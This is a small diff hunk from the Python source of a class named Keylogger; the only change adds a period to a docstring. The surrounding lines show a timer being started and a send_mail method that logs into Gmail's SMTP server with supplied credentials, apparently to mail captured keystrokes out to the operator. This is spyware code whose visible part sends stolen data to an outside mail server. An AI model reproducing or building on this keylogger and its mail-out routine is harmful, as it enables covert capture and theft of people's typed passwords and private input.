@@ -30,7 +30,7 @@ class Keylogger:
         timer.start()
 
     def send_mail(self, email, password, message):
-        """Send email smtp.google.com"""
+        """Send email smtp.google.com."""
         server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
         server.set_debuglevel(False)
         server.login(email, password)
